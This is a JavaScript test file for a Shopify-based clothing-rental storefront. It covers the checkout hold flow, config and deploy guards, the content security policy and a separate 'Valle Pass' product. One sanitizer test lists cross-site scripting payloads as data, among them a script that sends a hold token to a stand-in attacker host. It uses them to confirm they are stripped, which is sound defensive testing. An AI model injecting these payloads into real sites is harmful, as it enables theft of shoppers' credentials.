import assert from 'node:assert/strict';
import { test } from 'node:test';
import { readFileSync, readdirSync } from 'node:fs';
import { createRequire } from 'node:module';
import { randomUUID } from 'node:crypto';
import { runInNewContext } from 'node:vm';

const root = new URL('../', import.meta.url);
const read = (path) => readFileSync(new URL(path, root), 'utf8');
const activeFiles = (path) => readdirSync(new URL(path, root), { recursive: true, withFileTypes: true })
  .filter((entry) => entry.isFile())
  .map((entry) => readFileSync(`${entry.parentPath}/${entry.name}`, 'utf8'));
const require = createRequire(new URL('apps/marketing/package.json', root));
const ts = require('typescript');

// Exercise the actual framework-independent client module without adding a runner.
function load(path, globals = {}) {
  const exports = {};
  const code = ts.transpileModule(read(path), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2021 },
  }).outputText;
  runInNewContext(code, { exports, crypto: { randomUUID }, ...globals }, { filename: path });
  return exports;
}
const input = { items: [{ shopifyVariantId: '123', quantity: 1 }], pickupDate: '2030-10-15', termsAccepted: true };
const held = { ok: true, reservationId: 'reservation-fixture', holdToken: 'credential-fixture' };
const ready = { ok: true, checkoutUrl: 'https://example.test/checkout' };

function fixture(overrides = {}) {
  const calls = [];
  const deps = {
    async createHold(value) { calls.push(['hold', value]); return held; },
    async createCheckout(...args) { calls.push(['checkout', ...args]); return ready; },
    storeLastReservation(...args) { calls.push(['store', ...args]); },
    ...overrides,
  };
  const { createCheckoutAttempt } = load('apps/marketing/src/lib/checkout-attempt.ts', { require: () => deps });
  return { flow: createCheckoutAttempt(), calls, before: async () => { calls.push(['stock']); } };
}

test('stock -> HOLD -> store credential -> checkout, never checkout first', async () => {
  const { flow, calls, before } = fixture();
  assert.equal((await flow.run(input, before)).ok, true);
  assert.deepEqual(calls.map(([kind]) => kind), ['stock', 'hold', 'store', 'checkout']);
  assert.deepEqual(calls[3], ['checkout', held.reservationId, held.holdToken]);
});
test('checkout retry keeps the credential and skips stock occupied by its own HOLD', async () => {
  let attempts = 0;
  const { flow, calls, before } = fixture({ async createCheckout(id, token) {
    assert.equal(id, held.reservationId);
    assert.equal(token, held.holdToken);
    return ++attempts === 1 ? { ok: false, message: 'temporary' } : ready;
  } });
  assert.equal((await flow.run(input, before)).ok, false);
  assert.equal((await flow.run(input, before)).ok, true);
  assert.deepEqual(calls.map(([kind]) => kind), ['stock', 'hold', 'store']);
});
test('HOLD failure never opens checkout and preserves the idempotency key', async () => {
  const keys = [];
  const { flow, calls, before } = fixture({ async createHold(value) {
    keys.push(value.idempotencyKey);
    return { ok: false, reason: 'error', message: 'unavailable' };
  } });
  await flow.run(input, before);
  await flow.run(input, before);
  assert.equal(keys[0], keys[1]);
  assert.equal(calls.some(([kind]) => kind === 'checkout'), false);
});
test('Sunday choice must be resolved before a HOLD can open checkout', async () => {
  const keys = [];
  const { flow, calls, before } = fixture({ async createHold(value) {
    keys.push(value.idempotencyKey);
    return value.sundayReturnOption ? held : { ok: false, reason: 'needs_sunday_choice', returnOptions: [] };
  } });
  assert.equal((await flow.run(input, before)).reason, 'needs_sunday_choice');
  assert.equal(calls.some(([kind]) => kind === 'checkout'), false);
  assert.equal((await flow.run({ ...input, sundayReturnOption: 'saturday' }, before)).ok, true);
  assert.notEqual(keys[0], keys[1]);
});
test('quantity, pickup or Sunday option changes cannot reuse the previous HOLD', async () => {
  const { flow, calls, before } = fixture();
  await flow.run(input, before);
  await flow.run({ ...input, items: [{ shopifyVariantId: '123', quantity: 2 }] }, before);
  await flow.run({ ...input, pickupDate: '2030-10-16' }, before);
  await flow.run({ ...input, sundayReturnOption: 'mondayMorning' }, before);
  assert.equal(new Set(calls.filter(([kind]) => kind === 'hold').map(([, value]) => value.idempotencyKey)).size, 4);
});
test('parallel clicks cannot create parallel checkout attempts', async () => {
  let release;
  const wait = new Promise((resolve) => { release = resolve; });
  const { flow, calls } = fixture();
  const first = flow.run(input, () => wait);
  assert.equal((await flow.run(input, async () => {})).ok, false);
  release();
  assert.equal((await first).ok, true);
  assert.equal(calls.filter(([kind]) => kind === 'hold').length, 1);
});
test('reset while checkout is in flight discards the late redirect', async () => {
  let release;
  const wait = new Promise((resolve) => { release = resolve; });
  const { flow, before } = fixture({ async createCheckout() { flow.reset(); await wait; return ready; } });
  const pending = flow.run(input, before);
  release();
  const result = await pending;
  assert.equal(result.ok, false);
  assert.equal('checkoutUrl' in result, false);
});
test('only authoritative expiration releases the cached HOLD for a new attempt', async () => {
  const { flow, calls, before } = fixture({ async createCheckout() { return { ok: false, expired: true, message: 'expired' }; } });
  await flow.run(input, before);
  await flow.run(input, before);
  const keys = calls.filter(([kind]) => kind === 'hold').map(([, value]) => value.idempotencyKey);
  assert.equal(keys.length, 2);
  assert.notEqual(keys[0], keys[1]);
});
test('stock failure and unaccepted terms fail closed', async () => {
  const { flow, calls, before } = fixture();
  assert.equal((await flow.run({ ...input, termsAccepted: false }, before)).ok, false);
  assert.equal((await flow.run(input, async () => { throw new Error('stock failure'); })).ok, false);
  assert.equal(calls.length, 0);
  assert.equal((await flow.run(input, before)).ok, true);
});
test('HTTP 410 is distinguished from transient checkout failures', async () => {
  const { createCheckout } = load('apps/marketing/src/lib/checkout.ts', {
    process: { env: { NEXT_PUBLIC_CHECKOUT_URL: 'https://api.example.test/checkout' } },
    fetch: async () => ({ ok: false, status: 410, json: async () => ({ message: 'expired' }) }),
  });
  assert.equal((await createCheckout('id', 'token')).expired, true);
});
test('legacy calendar cannot fetch, invent availability or mutate Shopify carts', () => {
  const buttons = [{ disabled: false }];
  const panels = [{ hidden: false }];
  const status = {};
  const root = {
    dataset: { retiredMessage: 'Retired' },
    querySelectorAll: (selector) => selector === 'button' ? buttons : panels,
    querySelector: () => status,
  };
  const handlers = {};
  const document = { readyState: 'complete', querySelectorAll: () => [root], addEventListener: (event, handler) => { handlers[event] = handler; } };
  runInNewContext(read('apps/shopify-app/extensions/rental-calendar/assets/rental-calendar.js'), {
    document, fetch: () => { assert.fail('Legacy calendar must not access the network'); },
  });
  assert.equal(buttons[0].disabled, true);
  assert.equal(panels[0].hidden, true);
  assert.equal(status.textContent, 'Retired');
  buttons[0].disabled = false;
  handlers['shopify:section:load']({ target: document });
  assert.equal(buttons[0].disabled, true);
});
test('shopping cart never exposes checkoutUrl; only the HOLD checkout client does', () => {
  assert.doesNotMatch(read('apps/marketing/src/lib/cart.ts'), /checkoutUrl/);
});
test('Railway uses the package start command and preserves migrations and health', () => {
  const railway = JSON.parse(read('apps/reservations-api/railway.json'));
  const pkg = JSON.parse(read('apps/reservations-api/package.json'));
  assert.equal(railway.deploy.startCommand, 'pnpm --filter @valle/reservations-api run start');
  assert.equal(pkg.scripts.start, 'node dist/src/main.js');
  assert.equal(railway.deploy.healthcheckPath, '/health');
  assert.deepEqual(railway.deploy.preDeployCommand, ['pnpm --filter @valle/reservations-api run db:migrate']);
});
test('Shopify production config audits order creation before payment and syncs updates/deletes', () => {
  const config = read('apps/shopify-app/shopify.app.production.toml');
  assert.match(config, /topics\s*=\s*\[\s*"orders\/create",\s*"orders\/paid",\s*"orders\/cancelled",\s*"orders\/updated",\s*"orders\/delete",\s*"refunds\/create"\s*\]/);
});
test('no draft config can target the production app, and production scopes are never placeholders', () => {
  // `shopify app config use <nome>` + `deploy` publica o arquivo escolhido
  // POR CIMA da config remota do app que o `client_id` apontar. Um rascunho
  // com o client_id de produção e scopes PLACEHOLDER zera os scopes do app
  // real e derruba a instalação da loja junto com os webhooks de aluguel —
  // o cabeçalho de shopify.app.toml registra que isso já aconteceu uma vez.
  const clientIdOf = (file) => (read(`apps/shopify-app/${file}`).match(/^client_id\s*=\s*"([^"]*)"/m) ?? [])[1];
  const scopesOf = (file) => (read(`apps/shopify-app/${file}`).match(/^scopes\s*=\s*"([^"]*)"/m) ?? [])[1];

  const productionClientId = clientIdOf('shopify.app.production.toml');
  assert.ok(productionClientId, 'shopify.app.production.toml precisa declarar client_id');
  assert.doesNotMatch(scopesOf('shopify.app.production.toml') ?? '', /PLACEHOLDER/,
    'a config de produção nunca pode ir ao ar com scopes placeholder');

  const drafts = readdirSync(new URL('apps/shopify-app/', root))
    .filter((file) => /^shopify\.app\..*\.toml$/.test(file) && file !== 'shopify.app.production.toml');
  assert.ok(drafts.length > 0, 'a guarda só faz sentido se houver outros arquivos de config para vigiar');
  for (const draft of drafts) {
    assert.notEqual(clientIdOf(draft), productionClientId,
      `${draft} carrega o client_id de produção: um deploy a partir dele sobrescreve o app real`);
  }
});
test('active application code has no direct Mercado Pago integration', () => {
  const source = [
    ...activeFiles('apps/marketing/src'),
    ...activeFiles('apps/reservations-api/src'),
    ...activeFiles('apps/shopify-app/app'),
  ].join('\n');
  assert.doesNotMatch(source, /mercado\s*pago|mercadopago|preference_id|notification_url|mp_access_token|mp_public_key/i);
});
test('reservation confirmation never mutates Shopify inventory or captures/refunds payment', () => {
  const webhook = read('apps/reservations-api/src/webhooks/webhooks.service.ts');
  assert.match(webhook, /case 'orders\/paid'/);
  assert.doesNotMatch(webhook, /mutation\s+\w*(?:inventory|refund|paymentCapture|orderEdit)/i);
});

// ---------------------------------------------------------------------------
// Descrição da peça — HTML escrito no admin da Shopify, renderizado na nossa
// origem, que é a mesma do /closetadmin. Ver lib/product-description.ts.
// ---------------------------------------------------------------------------

function loadSanitizer() {
  return load('apps/marketing/src/lib/product-description.ts', {
    require: (id) => {
      if (id === 'server-only') return {};
      const mod = require(id);
      // transpileModule sem esModuleInterop emite `mod.default`; sanitize-html
      // é CommonJS e exporta a função direto.
      return typeof mod === 'function' ? Object.assign(mod, { default: mod }) : mod;
    },
  });
}

test('product description keeps its formatting but never executable content', () => {
  const { sanitizeProductDescription } = loadSanitizer();
  const kept = sanitizeProductDescription(
    '<p>Casaco <strong>impermeável</strong></p><ul><li>Tamanho M</li></ul><h3>Cuidados</h3>',
  );
  assert.match(kept, /<p>Casaco <strong>impermeável<\/strong><\/p>/);
  assert.match(kept, /<li>Tamanho M<\/li>/);
  assert.match(kept, /<h3>Cuidados<\/h3>/);

  for (const payload of [
    '<script>fetch("https://attacker.test?c="+localStorage.holdToken)</script>',
    '<img src=x onerror="alert(1)">',
    '<a href="javascript:alert(1)">clique</a>',
    '<iframe src="https://attacker.test"></iframe>',
    '<svg><animate onbegin="alert(1)" attributeName="x"></svg>',
    '<object data="data:text/html,<script>alert(1)</script>"></object>',
    '<style>@import url("https://attacker.test")</style>',
    '<form action="https://attacker.test"><input name="a"></form>',
    '<base href="https://attacker.test/">',
    '<xmp><script>alert(1)</script></xmp>',
  ]) {
    const clean = sanitizeProductDescription(payload);
    assert.doesNotMatch(clean, /<\s*(script|iframe|object|embed|style|form|base|svg|animate|xmp)\b/i, payload);
    assert.doesNotMatch(clean, /\son\w+\s*=/i, payload);
    assert.doesNotMatch(clean, /javascript:/i, payload);
    assert.doesNotMatch(clean, /attacker\.test/i, payload);
  }
});

test('the product page never renders Shopify description HTML unsanitized', () => {
  const page = read('apps/marketing/src/app/pecas/[handle]/page.tsx');
  assert.match(page, /sanitizeProductDescription\(/);
  // O valor entregue ao dangerouslySetInnerHTML tem de ser o sanitizado, nunca
  // o campo cru vindo da Storefront API.
  assert.doesNotMatch(page, /__html:\s*product\.descriptionHtml/);
  assert.match(page, /const descriptionHtml = sanitizeProductDescription\(/);
});

test('the storefront ships a CSP and a Permissions-Policy', () => {
  const config = read('apps/marketing/next.config.mjs');
  assert.match(config, /key: 'Content-Security-Policy'/);
  assert.match(config, /key: 'Permissions-Policy'/);
  for (const directive of [
    "default-src 'self'",
    "base-uri 'self'",
    "object-src 'none'",
    "frame-ancestors 'none'",
    "form-action 'self'",
  ]) {
    assert.ok(config.includes(directive), `CSP precisa manter a diretiva ${directive}`);
  }
  // `connect-src` sai das variáveis de ambiente do próprio cliente; um host
  // fixo escrito à mão ficaria errado quando a API mudasse de endereço.
  assert.doesNotMatch(config, /connect-src[^`]*https:\/\/[a-z0-9-]+\.(up\.railway\.app|vercel\.app)/i);
});

// ---------------------------------------------------------------------------
// Valle Pass — produto separado do fluxo de aluguel (sem calendário, sem
// disponibilidade, sem HOLD; só a compra normal via checkout da Shopify).
// ---------------------------------------------------------------------------

function loadValePassProduct(env = {}) {
  return load('apps/marketing/src/lib/vale-pass-product.ts', {
    process: { env: { NEXT_PUBLIC_VALE_PASS_PRODUCT_ID: undefined, NEXT_PUBLIC_VALE_PASS_VARIANT_ID: undefined, ...env } },
    require: () => ({ storeUrl: (path) => `https://loja-teste.myshopify.com${path}` }),
  });
}

const REAL_PRODUCT_ID = '8723909804132';
const REAL_VARIANT_ID = '49174518595684';

test('1) Valle Pass é identificado tanto por ID numérico quanto por GID da Shopify', () => {
  const { isValePassProduct } = loadValePassProduct();
  assert.equal(isValePassProduct({ productId: REAL_PRODUCT_ID }), true);
  assert.equal(isValePassProduct({ productId: `gid://shopify/Product/${REAL_PRODUCT_ID}` }), true);
  assert.equal(isValePassProduct({ variantId: REAL_VARIANT_ID }), true);
  assert.equal(isValePassProduct({ variantId: `gid://shopify/ProductVariant/${REAL_VARIANT_ID}` }), true);
});

test('1) a página da peça só renderiza ValePassPresentation (nunca RentalCalendar) quando o produto é o Valle Pass', () => {
  const page = read('apps/marketing/src/app/pecas/[handle]/page.tsx');
  assert.match(page, /isValePassProduct\(\{\s*productId:\s*product\.id,\s*variantId:\s*variant\?\.id\s*\}\)/);
  assert.match(page, /isValePass\s*\?\s*\(\s*<ValePassPresentation/);
});

test('2) a apresentação do Valle Pass nunca chama HOLD, disponibilidade ou reserva', () => {
  const source = read('apps/marketing/src/components/ValePassPresentation.tsx');
  assert.doesNotMatch(source, /createHold|fetchAvailability|addRentalToCart|RentalCalendar|NEXT_PUBLIC_HOLDS_URL|NEXT_PUBLIC_AVAILABILITY_URL|'use client'/);
  assert.doesNotMatch(source, /\bfetch\s*\(/);
});

test('3) produto de aluguel comum continua mostrando o calendário', () => {
  const { isValePassProduct } = loadValePassProduct();
  assert.equal(isValePassProduct({ productId: 'gid://shopify/Product/1111111111', variantId: 'gid://shopify/ProductVariant/2222222222' }), false);

  const page = read('apps/marketing/src/app/pecas/[handle]/page.tsx');
  assert.match(page, /\)\s*:\s*\(\s*<RentalCalendar/);
});

test('4) o checkout do Valle Pass continua funcionando — link direto pro carrinho oficial da Shopify', () => {
  const { valePassCheckoutHref } = loadValePassProduct();
  assert.equal(valePassCheckoutHref(REAL_VARIANT_ID), `https://loja-teste.myshopify.com/cart/${REAL_VARIANT_ID}:1`);
  assert.equal(
    valePassCheckoutHref(`gid://shopify/ProductVariant/${REAL_VARIANT_ID}`, 2),
    `https://loja-teste.myshopify.com/cart/${REAL_VARIANT_ID}:2`,
  );
});

test('Valle Pass: IDs de configuração por env (numérico ou GID) sobrepõem o default', () => {
  const { isValePassProduct } = loadValePassProduct({ NEXT_PUBLIC_VALE_PASS_PRODUCT_ID: 'gid://shopify/Product/9999999999' });
  assert.equal(isValePassProduct({ productId: '9999999999' }), true);
  assert.equal(isValePassProduct({ productId: REAL_PRODUCT_ID }), false);
});
